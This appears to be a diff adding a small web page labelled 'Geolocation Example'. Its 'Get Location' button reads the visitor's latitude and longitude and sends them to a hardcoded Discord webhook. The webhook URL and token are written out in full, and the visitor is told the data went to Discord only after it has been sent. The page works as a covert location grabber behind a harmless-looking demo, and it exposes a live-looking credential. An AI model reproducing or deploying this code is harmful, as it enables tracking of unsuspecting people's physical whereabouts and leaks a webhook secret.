@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Geolocation Example</title>
+</head>
+<body>
+    <button onclick="getLocation()">Get Location</button>
+
+    <p id="demo"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const payload = {
+                content: `Latitude: ${latitude}, Longitude: ${longitude}`
+            };
+            const url = "https://discord.com/api/webhooks/1078163488112914463/jaMlMNIa5Pi7c6MhXusBDMSQnMJ2j9t-CZqpS1rIvWLISkaXB6xq340dOEVMF1WGP3kE"; // Replace WEBHOOK_ID and WEBHOOK_TOKEN with your actual webhook ID and token
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                document.getElementById("demo").innerHTML = "Geolocation data sent to Discord webhook successfully.";
+            })
+            .catch(() => {
+                document.getElementById("demo").innerHTML = "Failed to send geolocation data to Discord webhook.";
+            });
+        }
+    </script>
+</body>
+</html>
